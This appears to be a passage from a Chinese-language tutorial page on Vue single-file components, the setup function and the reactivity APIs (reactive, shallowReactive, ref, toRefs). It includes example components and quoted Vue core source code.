<p><strong><a href="https://vuejs.org/guide/scaling-up/sfc.html#introduction">SFCs</a></strong> =&gt; Vue Single-File Components(a.k.a. *.vue files, abbreviated as SFC) =&gt; &#x5355;&#x6587;&#x4EF6;&#x7EC4;&#x4EF6;&#x80FD;&#x83B7;&#x5F97;&#x5B8C;&#x6574;&#x7684;&#x8BED;&#x6CD5;&#x9AD8;&#x4EAE;&#x3001;CommonJS &#x6A21;&#x5757;&#x4EE5;&#x53CA;&#x7EC4;&#x4EF6;&#x4F5C;&#x7528;&#x57DF;&#x7684; CSS&#x3002;<br>
<strong>SPA</strong> =&gt; single-page application &#x7F51;&#x7EDC;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x6216;&#x7F51;&#x7AD9;&#x7684;&#x6A21;&#x578B;&#xFF0C;&#x901A;&#x8FC7;&#x52A8;&#x6001;&#x91CD;&#x5199;&#x5F53;&#x524D;&#x9875;&#x9762;&#x6765;&#x4E0E;&#x7528;&#x6237;&#x4EA4;&#x4E92;&#xFF0C;&#x800C;&#x975E;&#x4F20;&#x7EDF;&#x7684;&#x4ECE;&#x670D;&#x52A1;&#x5668;&#x91CD;&#x65B0;&#x52A0;&#x8F7D;&#x6574;&#x4E2A;&#x65B0;&#x9875;&#x9762;&#x3002;</p>
</blockquote>
<p>&#x975E;&#x5355;&#x6587;&#x4EF6;&#x7EC4;&#x4EF6;&#x4E0D;&#x80FD;&#x4FDD;&#x8BC1;&#x5168;&#x5C40;&#x5B9A;&#x4E49;&#x7684;&#x7EC4;&#x4EF6;&#x540D;&#x552F;&#x4E00;&#xFF0C;&#x5728;&#x5B57;&#x7B26;&#x4E32;&#x6A21;&#x677F;&#x4E2D;&#x7F3A;&#x4E4F;&#x8BED;&#x6CD5;&#x9AD8;&#x4EAE;&#xFF0C;&#x4E0D;&#x652F;&#x6301; CSS&#x3002;&#x5176;&#x6784;&#x5EFA;&#x6B65;&#x9AA4;&#x4E2D;&#x53EA;&#x80FD;&#x4F7F;&#x7528; Html &#x548C; ES5 JavaScript&#xFF0C;&#x800C;&#x4E0D;&#x80FD;&#x4F7F;&#x7528; webpack &#x548C;&#x9884;&#x5904;&#x7406;&#x5668; Babel&#x3002;</p>
<pre><code class="language-html">&lt;template&gt;
  &lt;div&gt;Vue2 =&gt; &#x5355;&#x6587;&#x4EF6;&#x7EC4;&#x4EF6;&lt;/div&gt;
&lt;/template&gt;
&lt;script&gt;
export default { // &#x9ED8;&#x8BA4;&#x66B4;&#x9732;
  name:&apos;kebab-case|PascalCaseComponentName&apos;, // &#x4E0D;&#x5199;&#x5219;&#x9ED8;&#x8BA4;&#x66B4;&#x9732;&#x5355;&#x6587;&#x4EF6;&#x7EC4;&#x4EF6;&#x540D; =&gt; Xxx.vue &#x7684; Xxx
  data () { return { msg: &apos;&#x5355;&#x6587;&#x4EF6;&#x7EC4;&#x4EF6;&apos; } }
}
&lt;/script&gt;
&lt;style&gt;&lt;/style&gt;
</code></pre>
<pre><code class="language-javascript">Vue.component(&apos;kebab-case|PascalCaseComponentName&apos;, {
  data: function () {
    return { ... }
  },
  template: &apos;&lt;...&gt;&#x975E;&#x5355;&#x6587;&#x4EF6;&#x7EC4;&#x4EF6;&lt;... /&gt;&apos;
})
</code></pre>
<pre><code class="language-html">&lt;template&gt;
  &lt;h1&gt;{{ msg }}&lt;/h1&gt;
  &lt;button @click=&quot;sayHi()&quot;&gt;Hi Vue3&lt;/button&gt;
&lt;/template&gt;
&lt;script&gt;
export default {
  name: &apos;HelloWorld&apos;,
  setup(){
    const msg = &quot;Hello Vue3&quot;;
    const sayHi = () =&gt; {
      console.log(&quot;Hi Vue3&quot;)
    };
    return { msg, sayHi }
  }
}
&lt;/script&gt;
</code></pre>
<pre><code class="language-html">&lt;template&gt;
  &lt;button @click=&quot;increment&quot;&gt;Count is: {{ count }}&lt;/button&gt;
&lt;/template&gt;
&lt;script setup&gt;
import { ref, onMounted } from &apos;vue&apos;
const count = ref(0) // &#x54CD;&#x5E94;&#x5F0F;&#x72B6;&#x6001;
function increment() { count.value++ } // &#x7528;&#x6765;&#x4FEE;&#x6539;&#x72B6;&#x6001;&#x3001;&#x89E6;&#x53D1;&#x66F4;&#x65B0;&#x7684;&#x51FD;&#x6570;
onMounted(() =&gt; { console.log(`The initial count is ${count.value}.`) }) // &#x751F;&#x547D;&#x5468;&#x671F;&#x94A9;&#x5B50;
&lt;/script&gt;
</code></pre>
<p>setup &#x4F5C;&#x4E3A;&#x7EC4;&#x5408;&#x5F0F; API &#x7684;&#x5165;&#x53E3;&#xFF0C;&#x662F;&#x4E00;&#x4E2A;&#x7EC4;&#x4EF6;&#x9009;&#x9879;&#xFF0C;&#x5728;&#x7EC4;&#x4EF6;&#x88AB;&#x521B;&#x5EFA;&#x4E4B;&#x524D;&#x4E14; props &#x88AB;&#x89E3;&#x6790;&#x4E4B;&#x540E;&#x6267;&#x884C;&#x3002;setup &#x5199;&#x6CD5;&#x4E2D;&#x53EF;&#x4EE5;&#x901A;&#x8FC7; ...toRefs &#x65B9;&#x5F0F;&#x5C06;&#x54CD;&#x5E94;&#x5F0F;&#x5BF9;&#x8C61;&#x4E2D;&#x7684;&#x6BCF;&#x4E2A;&#x5C5E;&#x6027;&#x8F6C;&#x53D8;&#x4E3A;&#x54CD;&#x5E94;&#x5F0F;&#x6570;&#x636E;&#xFF0C;&#x7B80;&#x5316;&#x6A21;&#x677F;&#x4E2D;&#x7684;&#x547D;&#x540D;&#x5BF9;&#x8C61;&#x7684;&#x6307;&#x5B9A;&#x3002;&#x4E14; setup &#x8FD4;&#x56DE;&#x7684;&#x6240;&#x6709;&#x5185;&#x5BB9;&#x90FD;&#x4F1A;&#x66B4;&#x9732;&#x7ED9;&#x7EC4;&#x4EF6;&#x7684;&#x5176;&#x4F59;&#x90E8;&#x5206; (&#x8BA1;&#x7B97;&#x5C5E;&#x6027;&#x3001;&#x65B9;&#x6CD5;&#x3001;&#x751F;&#x547D;&#x5468;&#x671F;&#x7B49;) &#x4EE5;&#x53CA;&#x7EC4;&#x4EF6;&#x7684;&#x6A21;&#x677F;&#x3002;</p>
<pre><code class="language-javascript">import { reactive, toRefs } from &quot;vue&quot;;
export default {
  name: &quot;Test01&quot;,
  setup(){
    const data = reactive({
      name:&apos;okk&apos;, age:20, func(){ console.log(&apos;Hello Vue3&apos;) }
    })
    return{ ...toRefs(data) } // =&gt; {{ name }}&#x3001;{{ age }}&#x3001;@&lt;event&gt;=&quot;func&quot;
  }
}
</code></pre>
<p>setup &#x51FD;&#x6570;&#x5177;&#x6709;&#x4E24;&#x4E2A;&#x53C2;&#x6570; props &#x548C; context&#xFF0C;props &#x662F;&#x7531;&#x4E0A;&#x7EA7;&#x7EC4;&#x4EF6;&#x6240;&#x4F20;&#x9012;&#x7684;&#x5C5E;&#x6027;&#x7EC4;&#x6210;&#x7684;&#x5BF9;&#x8C61;&#xFF0C;context &#x5BF9;&#x8C61;&#x5305;&#x542B; attrs&#xFF0C;slots &#x548C; emit &#x5C5E;&#x6027;&#x3002;</p>
<p>&#x4F7F;&#x7528; &lt;script setup&gt; &#x65F6;&#xFF0C;&#x58F0;&#x660E;&#x7684;&#x9876;&#x5C42;&#x7ED1;&#x5B9A;&#xFF08;&#x58F0;&#x660E;&#x53D8;&#x91CF;&#x3001;&#x51FD;&#x6570;&#x4EE5;&#x53CA;&#x5F15;&#x5165;&#x5185;&#x5BB9;&#xFF09;&#x90FD;&#x80FD;&#x5728;&#x6A21;&#x677F;&#x4E2D;&#x76F4;&#x63A5;&#x4F7F;&#x7528;&#xFF0C;&#x4E0D;&#x9700;&#x8981;&#x8FD4;&#x56DE;&#x3002;&#x4F46;&#x82E5;&#x9700;&#x5C06;&#x54CD;&#x5E94;&#x5F0F;&#x5BF9;&#x8C61;&#x4E2D;&#x7684;&#x6BCF;&#x4E2A;&#x5C5E;&#x6027;&#x90FD;&#x8F6C;&#x6362;&#x4E3A;&#x54CD;&#x5E94;&#x5F0F;&#x6570;&#x636E;&#xFF0C;&#x90A3;&#x4E48;&#x9700;&#x8981;&#x501F;&#x52A9; toRefs() &#x7684;&#x89E3;&#x6784;&#x3002;</p>
<p>&#x5F53; &lt;script setup&gt; &#x4E0E; &lt;script&gt; &#x6807;&#x7B7E;&#x540C;&#x65F6;&#x5B58;&#x5728;&#x65F6;&#xFF0C;&#x540E;&#x8005; setup() &#x4E2D;&#x5B9A;&#x4E49;&#x7684;&#x4EFB;&#x4F55;&#x53D8;&#x91CF;&#x548C;&#x65B9;&#x6CD5;&#x90FD;&#x4E0D;&#x80FD;&#x5728;&#x6A21;&#x677F;&#x8FDB;&#x884C;&#x8BBF;&#x95EE;&#x3002;</p>
<pre><code class="language-javascript">&lt;script setup&gt;
import { reactive,toRefs } from &quot;vue&quot;;
const data = reactive({ name:&apos;okk&apos;, age:20, func(){ console.log(&apos;Hello Vue3&apos;) } })
const { name,age,func } = toRefs(data)
&lt;/script&gt;
</code></pre>
<h3 id="%E5%93%8D%E5%BA%94%E5%BC%8F%E6%95%B0%E6%8D%AE">&#x54CD;&#x5E94;&#x5F0F;&#x6570;&#x636E;</h3>
<p>&#x76F4;&#x63A5;&#x5BF9;&#x53D8;&#x91CF;&#x8FDB;&#x884C;&#x5B57;&#x9762;&#x91CF;&#x8D4B;&#x503C;&#x7684;&#x64CD;&#x4F5C;&#x4E0D;&#x4F1A;&#x4EA7;&#x751F;&#x54CD;&#x5E94;&#x5F0F;&#x7684;&#x6548;&#x679C;&#xFF0C;&#x6240;&#x4EE5;&#x5728;&#x6570;&#x636E;&#x66F4;&#x65B0;&#x65F6;&#x4E0D;&#x4F1A;&#x9A71;&#x52A8;&#x89C6;&#x56FE;&#x7684;&#x66F4;&#x65B0;&#x3002;&#x82E5;&#x8981;&#x5B9A;&#x4E49;&#x54CD;&#x5E94;&#x5F0F;&#x6570;&#x636E;&#xFF0C;&#x9700;&#x8981;&#x501F;&#x52A9;&#x4ECE; vue &#x5BFC;&#x5165;&#x7684;&#x76F8;&#x5173; function&#x3002;&#x5B9A;&#x4E49;&#x54CD;&#x5E94;&#x5F0F;&#x6570;&#x636E; =&gt; reactive()&#x3001;ref()&#xFF1B;&#x8F85;&#x52A9;&#x51FD;&#x6570; =&gt; toRef()&#x3001;toRefs()&#x3002;</p>
<p>ref &#x4EA7;&#x751F;&#x7684;&#x54CD;&#x5E94;&#x5F0F;&#x6570;&#x636E;&#x5728;&#x4FEE;&#x6539;&#x548C;&#x8BFB;&#x53D6;&#x65F6;&#x5E94;&#x6307;&#x5B9A;&#x5176; value&#xFF1B;ref &#x4EA7;&#x751F;&#x7684;&#x54CD;&#x5E94;&#x5F0F;&#x6570;&#x636E;&#x5728;&#x6A21;&#x677F;&#x4E2D;&#x4F7F;&#x7528;&#x65F6;&#xFF0C;&#x53EF;&#x4EE5;&#x7701;&#x7565; <code>.value</code>&#x3002;</p>
<ul>
<li><a href="https://cn.vuejs.org/api/reactivity-core.html#reactive">reactive</a> =&gt; &#x4F20;&#x5165;&#x5BF9;&#x8C61;&#x6216;&#x6570;&#x7EC4;</li>
</ul>
<blockquote>
<p>&#x9664; null &#x548C; undefined &#x7684;&#x539F;&#x59CB;&#x7C7B;&#x578B;&#x90FD;&#x6709;&#x5176;&#x76F8;&#x5E94;&#x7684;&#x5305;&#x88C5;&#x5BF9;&#x8C61; =&gt; BigInt&#x3001;Symbol&#x3001;String&#x3001;Number&#x3001;Boolean</p>
</blockquote>
<p>&#x901A;&#x8FC7;&#x4F20;&#x5165;&#x666E;&#x901A;&#x5BF9;&#x8C61;&#xFF08;&#x975E;&#x5305;&#x88C5;&#x5BF9;&#x8C61;&#xFF09;&#x4F5C;&#x4E3A;&#x53C2;&#x6570;&#x521B;&#x5EFA;&#x54CD;&#x5E94;&#x5F0F;&#x5BF9;&#x8C61;&#xFF0C;&#x82E5;&#x53C2;&#x6570;&#x662F;&#x5B57;&#x7B26;&#x4E32;&#x6216;&#x6570;&#x5B57;&#x5219;&#x4F1A;&#x62A5;&#x51FA;&#x8B66;&#x544A;&#xFF0C;<a href="https://cn.vuejs.org/guide/extras/composition-api-faq.html#comparison-with-react-hooks">&#x7C7B;&#x4F3C;</a> <a href="https://zh-hans.reactjs.org/docs/hooks-intro.html">React Hook</a> &#x4E2D;&#x7684; <code>useState()</code> &#x548C; <code>useReducer()</code>&#x3002;&#x5F53;&#x76F4;&#x63A5;&#x4ECE;&#x54CD;&#x5E94;&#x5F0F;&#x6570;&#x636E;&#x5BF9;&#x8C61;&#x4E2D;&#x89E3;&#x6784;&#x5C5E;&#x6027;&#x65F6;&#xFF0C;&#x4F1A;&#x9020;&#x6210;&#x54CD;&#x5E94;&#x5F0F;&#x7684;&#x4E22;&#x5931;&#x3002;</p>
<pre><code class="language-javascript">&lt;template&gt;
  &lt;div&gt;{{ countobj.count }}-&lt;button @click=&quot;add&quot;&gt;clickme add&lt;/button&gt;&lt;/div&gt;
&lt;/template&gt;
&lt;script&gt;
import { reactive } from &apos;vue&apos;
export default {
  setup() {
    const countobj = reactive({ count: 0, });
    const add = () =&gt; { countobj.count++; };
    return { countobj, add, };
  },
};
&lt;/script&gt;
</code></pre>
<p>reactive &#x6E90;&#x7801;&#x4F4D;&#x4E8E; .../node_modules/@vue/reactivity/dist/reactivity.d.ts&#xFF0C;&#x5176;&#x63A5;&#x53D7;&#x7C7B;&#x578B;&#x662F;&#x6CDB;&#x578B; T &#x7684;&#x53C2;&#x6570; target&#x3002;T extends object =&gt; target &#x7684;&#x7C7B;&#x578B;&#x662F; object &#x7C7B;&#x578B;&#x6216;&#x7EE7;&#x627F;&#x81EA; object &#x7C7B;&#x7684;&#x5B50;&#x7C7B;&#x7C7B;&#x578B;&#x3002;&#x8FD4;&#x56DE;&#x503C;&#x7C7B;&#x578B;&#x4E3A; <code>UnwrapNestedRefs&lt;T&gt;</code>&#x3002;</p>
<blockquote>
<p>Creates a reactive copy of the original object.<br>
The reactive conversion is &quot;deep&quot;&#x2014;it affects all nested properties. In the ES2015 Proxy based implementation, the returned proxy is <strong>not</strong> equal to the original object. It is recommended to work exclusively with the reactive proxy and avoid relying on the original object.<br>
A reactive object also automatically unwraps refs contained in it, so you don&apos;t need to use <code>.value</code> when accessing and mutating their value:</p>
</blockquote>
<p><code>type</code> &#x5173;&#x952E;&#x5B57;&#x58F0;&#x660E;&#x7684;&#x7C7B;&#x578B; <code>UnwrapNestedRefs&lt;T&gt;</code> &#x901A;&#x8FC7;&#x5224;&#x65AD; T &#x662F;&#x5426;&#x5C5E;&#x4E8E; Ref &#x6216;&#x5176;&#x5B50;&#x7C7B;&#xFF0C;&#x6307;&#x5B9A;&#x4F20;&#x5165;&#x7684; T &#x6216;&#x8005; <code>UnwrapRefSimple&lt;T&gt;</code>&#x3002;</p>
<pre><code class="language-typescript">// reactive &#x7684;&#x7C7B;&#x578B;&#x58F0;&#x660E; - Creates a reactive copy of the original object.
export declare function reactive&lt;T extends object&gt;(target: T): UnwrapNestedRefs&lt;T&gt;;
...
// UnwrapNestedRefs&lt;T&gt; &#x7C7B;&#x578B;
export declare type UnwrapNestedRefs&lt;T&gt; = T extends Ref ? T : UnwrapRefSimple&lt;T&gt;;
</code></pre>
<p>reactive &#x65B9;&#x6CD5;&#x7684;&#x5B9A;&#x4E49;&#x4E8E; .../@vue/reactivity/dist/reactivity.global.js&#x3002;&#x6B64;&#x5904;&#x662F;&#x7F16;&#x8BD1;&#x540E;&#x7684; JS &#x7248;&#x672C;&#xFF0C;&#x9700;&#x8981;&#x67E5;&#x770B; TS &#x7248;&#x672C;&#x7684;<a href="https://github.com/vuejs/core/blob/main/packages/reactivity/src/reactive.ts">&#x70B9;&#x6B64;</a>&#x3002;</p>
<p>reactive &#x63A5;&#x53D7; object &#x7C7B;&#x578B;&#x7684;&#x53C2;&#x6570; target&#x3002;&#x82E5;&#x4F20;&#x5165;&#x5BF9;&#x8C61;&#x53EA;&#x8BFB;&#x5219;&#x8FD4;&#x56DE;&#x672C;&#x8EAB;&#xFF0C;as &#x65AD;&#x8A00;&#x5173;&#x952E;&#x5B57;&#x8868;&#x793A;&#x4F20;&#x5165;&#x7684;&#x503C;&#x4E00;&#x5B9A;&#x4E3A; Target &#x7C7B;&#x578B;&#xFF0C;<code>ReactiveFlags.IS_READONLY</code> &#x6839;&#x636E;&#x679A;&#x4E3E;&#x7C7B;&#x5224;&#x65AD;&#x662F;&#x5426;&#x4E3A;&#x53EA;&#x8BFB;&#x7684;&#x5C5E;&#x6027;&#xFF1B;&#x5F53;&#x4F20;&#x9012;&#x7684;&#x5BF9;&#x8C61;&#x662F;&#x666E;&#x901A;&#x5BF9;&#x8C61;&#xFF0C;&#x5219;&#x4F1A;&#x6267;&#x884C;&#x521B;&#x5EFA;&#x54CD;&#x5E94;&#x5F0F;&#x5BF9;&#x8C61;&#x51FD;&#x6570; <code>createReactiveObject(...)</code>&#x3002;</p>
<pre><code class="language-typescript">export function reactive(target: object) {
  // if trying to observe a readonly proxy, return the readonly version.
  if (isReadonly(target)) {
    return target
  }
  return createReactiveObject(
    target, false, mutableHandlers, mutableCollectionHandlers, reactiveMap
  )
}
...
export function isReadonly(value: unknown): boolean {
  return !!(value &amp;&amp; (value as Target)[ReactiveFlags.IS_READONLY])
}
</code></pre>
<table>
<thead>
<tr>
<th style="text-align:center">reactive.ts &#x4E2D;&#x8FD4;&#x56DE; createReactiveObject() &#x7684;&#x51FD;&#x6570;</th>
<th style="text-align:center">&#x63CF;&#x8FF0;</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">reactive</td>
<td style="text-align:center">&#x521B;&#x5EFA;&#x6DF1;&#x5C42;&#x54CD;&#x5E94;&#x7684;&#x53EF;&#x8BFB;&#x5199;&#x4EE3;&#x7406;&#x5BF9;&#x8C61;</td>
</tr>
<tr>
<td style="text-align:center">readonly</td>
<td style="text-align:center">&#x521B;&#x5EFA;&#x6DF1;&#x5C42;&#x54CD;&#x5E94;&#x7684;&#x53EA;&#x8BFB;&#x4EE3;&#x7406;&#x5BF9;&#x8C61;</td>
</tr>
<tr>
<td style="text-align:center">shallowReactive</td>
<td style="text-align:center">&#x521B;&#x5EFA;&#x6D45;&#x5C42;&#x54CD;&#x5E94;&#x7684;&#x53EF;&#x8BFB;&#x5199;&#x4EE3;&#x7406;&#x5BF9;&#x8C61;</td>
</tr>
<tr>
<td style="text-align:center">shallowReadonly</td>
<td style="text-align:center">&#x521B;&#x5EFA;&#x6D45;&#x5C42;&#x54CD;&#x5E94;&#x7684;&#x53EA;&#x8BFB;&#x4EE3;&#x7406;&#x5BF9;&#x8C61;</td>
</tr>
</tbody>
</table>
<pre><code class="language-typescript">function createReactiveObject(
  target: Target,
  isReadonly: boolean,
  baseHandlers: ProxyHandler&lt;any&gt;,
  collectionHandlers: ProxyHandler&lt;any&gt;,
  proxyMap: WeakMap&lt;Target, any&gt;
) {
  if (!isObject(target)) {
    if (__DEV__) {
      console.warn(`value cannot be made reactive: ${String(target)}`)
    }
    return target
  }
  // target is already a Proxy, return it.
  // exception: calling readonly() on a reactive object
  if (
    target[ReactiveFlags.RAW] &amp;&amp;
    !(isReadonly &amp;&amp; target[ReactiveFlags.IS_REACTIVE])
  ) {
    return target
  }
  // target already has corresponding Proxy
  const existingProxy = proxyMap.get(target)
  if (existingProxy) {
    return existingProxy
  }
  // only specific value types can be observed.
  const targetType = getTargetType(target)
  if (targetType === TargetType.INVALID) {
    return target
  }
  const proxy = new Proxy(
    target,
    targetType === TargetType.COLLECTION ? collectionHandlers : baseHandlers
  )
  proxyMap.set(target, proxy)
  return proxy
}
</code></pre>
<p><code>createReactiveObject(...)</code> &#x5927;&#x4F53;&#x60C5;&#x51B5;&#x4E0B;&#x662F;&#x8FD4;&#x56DE;&#x901A;&#x8FC7; <code>new Proxy(..)</code> &#x6784;&#x9020;&#x51FD;&#x6570;&#x6784;&#x5EFA;&#x51FA;&#x6765;&#x7684; proxy&#x3002;</p>
<p>&#x5728;&#x4F7F;&#x7528; reactive &#x4F20;&#x9012;&#x53C2;&#x6570;&#x65F6;&#xFF0C;&#x53EF;&#x4EE5;&#x662F;&#x5BF9;&#x8C61;&#x4E5F;&#x53EF;&#x4EE5;&#x662F;&#x539F;&#x59CB;&#x503C;&#xFF0C;&#x4F46;&#x662F;&#x540E;&#x8005;&#x5E76;&#x4E0D;&#x4F1A;&#x88AB;&#x5305;&#x88C5;&#x6210;&#x54CD;&#x5E94;&#x5F0F;&#x6570;&#x636E;&#xFF1B;&#x8FD4;&#x56DE;&#x7684;&#x54CD;&#x5E94;&#x5F0F;&#x6570;&#x636E;&#x672C;&#x8D28;&#x4E3A; Proxy &#x5BF9;&#x8C61;&#x3002;</p>
<p>&#x8FD4;&#x56DE;&#x7684;&#x54CD;&#x5E94;&#x5F0F;&#x526F;&#x672C;&#x4E0E;&#x539F;&#x59CB;&#x6570;&#x636E;&#x6709;&#x5173;&#x8054;&#xFF0C;&#x5F53;&#x539F;&#x59CB;&#x5BF9;&#x8C61;&#x91CC;&#x7684;&#x6570;&#x636E;&#x6216;&#x54CD;&#x5E94;&#x5F0F;&#x5BF9;&#x8C61;&#x91CC;&#x7684;&#x6570;&#x636E;&#x53D1;&#x751F;&#x53D8;&#x5316;&#x65F6;&#xFF0C;&#x5F7C;&#x6B64;&#x90FD;&#x4F1A;&#x88AB;&#x76F8;&#x4E92;&#x5F71;&#x54CD;&#xFF0C;&#x4F46;&#x662F;&#x524D;&#x8005;&#x6570;&#x636E;&#x6539;&#x53D8;&#x4E0D;&#x4F1A;&#x89E6;&#x53D1;&#x754C;&#x9762;&#x66F4;&#x65B0;&#x3002;</p>
<ul>
<li>shallowReactive =&gt; &#x53EA;&#x8003;&#x8651;&#x5BF9;&#x8C61;&#x7C7B;&#x578B;&#x6700;&#x5916;&#x5C42;&#x7684;&#x54CD;&#x5E94;&#x5F0F;</li>
</ul>
<p>&#x76F8;&#x6BD4; reactive &#x904D;&#x5386;&#x6240;&#x6709;&#x5C42;&#x6B21;&#x7684;&#x6570;&#x636E;&#x751F;&#x6210;&#x54CD;&#x5E94;&#x5F0F;&#xFF0C;shallowReactive &#x53EA;&#x5904;&#x7406;&#x7B2C;&#x4E00;&#x5C42;&#x3002;</p>
<p>&#x5F00;&#x53D1;&#x4E2D;&#x9002;&#x5408;&#x7EB5;&#x5411;&#x6DF1;&#xFF0C;&#x4F46;&#x4EC5;&#x4F1A;&#x66F4;&#x6539;&#x6700;&#x5916;&#x5C42;&#x5C5E;&#x6027;&#x7684;&#x6570;&#x636E;&#x5BF9;&#x8C61;&#x3002;</p>
<ul>
<li><a href="https://cn.vuejs.org/api/reactivity-core.html#ref">ref</a> =&gt; &#x4F20;&#x5165;&#x539F;&#x59CB;&#x6570;&#x636E;&#x4EE5;&#x521B;&#x5EFA;&#x542B;&#x6709;&#x54CD;&#x5E94;&#x5F0F;&#x5C5E;&#x6027; value &#x7684;&#x5305;&#x88C5;&#x5F0F;&#x5BF9;&#x8C61;</li>
</ul>
<p>&#x54CD;&#x5E94;&#x5F0F;&#x5BF9;&#x8C61;&#x4E2D;&#x7684; <code>__v_isRef</code> &#x5C5E;&#x6027;&#x7528;&#x4E8E;&#x533A;&#x5206;&#x5F53;&#x524D;&#x5BF9;&#x8C61;&#x662F; ref &#x6216;&#x662F;&#x666E;&#x901A;&#x5BF9;&#x8C61;&#xFF0C;&#x524D;&#x8005;&#x5728;&#x6A21;&#x677F;&#x89E3;&#x6790;&#x671F;&#x95F4;&#x4F1A;&#x76F4;&#x63A5;&#x53D6;&#x51FA; value &#x5C5E;&#x6027;&#xFF08;&#x6A21;&#x677F;&#x4E2D;&#x7701;&#x7565; fieldName.value&#xFF09;&#x3002;</p>
<p>&#x6240;&#x8C13;&#x54CD;&#x5E94;&#x5F0F;&#x4E22;&#x5931;&#xFF0C;&#x5C31;&#x662F;&#x5BF9;&#x901A;&#x8FC7; reactive &#x751F;&#x6210;&#x7684;&#x54CD;&#x5E94;&#x5F0F;&#x5BF9;&#x8C61;&#x6570;&#x636E;&#x4F7F;&#x7528;&#x5C55;&#x5F00;&#x8FD0;&#x7B97;&#x7B26;&#xFF0C;&#x5C06;&#x4EE3;&#x7406;&#x7684;&#x54CD;&#x5E94;&#x5F0F;&#x5BF9;&#x8C61;&#x6570;&#x636E;&#x8F6C;&#x6362;&#x4E3A;&#x666E;&#x901A;&#x5BF9;&#x8C61;&#x6570;&#x636E;&#x3002;&#x6B64;&#x65F6;&#x4FEE;&#x6539;&#x5BF9;&#x8C61;&#x7684;&#x5C5E;&#x6027;&#x503C;&#xFF0C;&#x4E0D;&#x4F1A;&#x89E6;&#x53D1;&#x66F4;&#x65B0;&#x548C;&#x6A21;&#x677F;&#x6E32;&#x67D3;&#x3002;ref =&gt; &#x4E0D;&#x4F46;&#x53EF;&#x7528;&#x4E8E;&#x5B9E;&#x73B0;&#x539F;&#x59CB;&#x503C;&#x7684;&#x54CD;&#x5E94;&#x5F0F;&#x4EE3;&#x7406;&#xFF0C;&#x8FD8;&#x53EF;&#x4EE5;&#x7528;&#x4E8E;&#x89E3;&#x51B3;&#x54CD;&#x5E94;&#x5F0F;&#x7684;&#x4E22;&#x5931;&#x95EE;&#x9898;&#x3002;</p>
<pre><code class="language-html">&lt;template&gt;
  &lt;div&gt;{{ count }}-&lt;button @click=&quot;add&quot;&gt;clickme add&lt;/button&gt;&lt;/div&gt;
&lt;/template&gt;
&lt;script&gt;
import { ref } from &quot;vue&quot;;
export default {
  setup() {
    const count = ref(0), add = () =&gt; { count.value++; };
    console.log(count) // RefImpl {__v_isShallow: false, dep: undefined, __v_isRef: true, _rawValue: 0, _value: 0}
    return { count, add };
  },
};
&lt;/script&gt;
</code></pre>
<p>&#x4F20;&#x9012;&#x7684;&#x539F;&#x59CB;&#x6570;&#x636E;&#x53EF;&#x4EE5;&#x662F;&#x539F;&#x59CB;&#x503C;&#x4E5F;&#x53EF;&#x4EE5;&#x662F;&#x5F15;&#x7528;&#x503C;&#xFF0C;&#x82E5;&#x4F20;&#x9012;&#x539F;&#x59CB;&#x503C;&#xFF0C;&#x5219;&#x6307;&#x5411;&#x539F;&#x59CB;&#x6570;&#x636E;&#x7684;&#x503C;&#x4FDD;&#x5B58;&#x5728;&#x8FD4;&#x56DE;&#x7684;&#x54CD;&#x5E94;&#x5F0F;&#x6570;&#x636E;&#x5BF9;&#x8C61;&#x7684; <code>.value</code> &#x4E2D;&#xFF1B;&#x82E5;&#x4F20;&#x9012;&#x5F15;&#x7528;&#x503C;&#xFF0C;&#x5219;&#x8FD4;&#x56DE;&#x7684;&#x54CD;&#x5E94;&#x5F0F;&#x6570;&#x636E;&#x5BF9;&#x8C61;&#x7684; <code>.value</code> &#x5C5E;&#x6027;&#x4E2D;&#x5177;&#x6709;&#x6307;&#x5411;&#x5BF9;&#x5E94;&#x7684;&#x539F;&#x59CB;&#x6570;&#x636E;&#xFF08;&#x5F15;&#x7528;&#x503C;|&#x5BF9;&#x8C61;&#xFF09;&#x7684; Proxy &#x526F;&#x672C;&#x3002;</p>
<pre><code class="language-html">&lt;template&gt;
  &lt;div&gt;
    &lt;div&gt;count01 =&gt; {{ count01 }}&lt;/div&gt;
    &lt;button @click=&quot;add01&quot;&gt;Click Me&lt;/button&gt;
    &lt;div&gt;count02 =&gt; {{ count02 }}&lt;/div&gt;
    &lt;button @click=&quot;add02&quot;&gt;Click Me&lt;/button&gt;
  &lt;/div&gt;
&lt;/template&gt;
&lt;script&gt;
import { ref } from &quot;vue&quot;;
export default {
  setup() {
    let origin01 = 0, origin02 = { val: 0 }; // &#x539F;&#x59CB;&#x6570;&#x636E;&#x5206;&#x522B;&#x4E3A;&#x539F;&#x59CB;&#x503C;&#x3001;&#x5F15;&#x7528;&#x503C;
    let count01 = ref(origin01), count02 = ref(origin02);
    console.log(&quot;count01&quot;, count01); // count01 RefImpl {__v_isShallow: false, dep: undefined, __v_isRef: true, _rawValue: 0, _value: 0}
    console.log(&quot;count02&quot;, count02); // count02 RefImpl {__v_isShallow: false, dep: undefined, __v_isRef: true, _rawValue: {&#x2026;}, _value: Proxy}
    function add01() { count01.value++; }
    function add02() { count02.value.val++; }
    return { count01, count02, add01, add02, };
  }
};
&lt;/script&gt;
</code></pre>
<p>ref &#x65B9;&#x6CD5;&#x7684;&#x5B9A;&#x4E49;&#x4E8E; ../node_modules/vue/dist/vue.global.js&#x3002;&#x6B64;&#x5904;&#x662F;&#x7F16;&#x8BD1;&#x540E;&#x7684; JS &#x7248;&#x672C;&#xFF0C;&#x9700;&#x8981;&#x67E5;&#x770B; TS &#x7248;&#x672C;&#x7684;<a href="https://github.com/vuejs/core/blob/a95554d35c65e5bfd0bf9d1c5b908ae789345a6d/packages/reactivity/src/ref.ts">&#x70B9;&#x6B64;</a>&#x3002;</p>
<pre><code class="language-typescript">export function ref(value?: unknown) {
  return createRef(value, false)
}
...
function createRef(rawValue: unknown, shallow: boolean) {
  if (isRef(rawValue)) {
    return rawValue
  }
  return new RefImpl(rawValue, shallow)
}
...
export function isRef(r: any): r is Ref {
  return !!(r &amp;&amp; r.__v_isRef === true)
}
</code></pre>
